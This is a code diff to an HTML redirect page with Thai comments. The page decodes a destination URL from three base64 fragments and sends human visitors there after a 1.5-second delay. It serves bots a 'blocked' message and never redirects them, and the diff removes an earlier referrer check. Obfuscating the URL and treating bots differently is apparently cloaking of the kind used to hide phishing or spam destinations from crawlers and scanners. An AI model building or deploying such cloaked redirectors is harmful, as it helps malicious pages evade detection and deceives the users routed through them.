@@ -25,14 +25,16 @@
 
     function shouldRedirect() {
       if (isBot) return false;
-      return true; // ไม่เช็ค referrer แล้ว
+      return true;
     }
 
-    // เริ่มการเปลี่ยนเส้นทาง
+    // เริ่มการเปลี่ยนเส้นทาง (ดีเลย์ 1.5 วิ)
     function go() {
       if (shouldRedirect()) {
-        const finalUrl = atob(part1) + atob(part2) + atob(part3);
-        window.location.href = finalUrl;
+        setTimeout(() => {
+          const finalUrl = atob(part1) + atob(part2) + atob(part3);
+          window.location.href = finalUrl;
+        }, 1500); // ดีเลย์ 1500ms = 1.5 วินาที
       } else {
         document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>ระบบป้องกันบล็อกไว้</p>";
       }
@@ -43,5 +45,6 @@
 </head>
 <body>
   <h1>กำลังเปลี่ยนเส้นทาง กรุณารอสักครู่...</h1>
+  <p>คุณจะถูกพาไปยังหน้าถัดไปภายใน 1.5 วินาที</p>
 </body>
 </html>
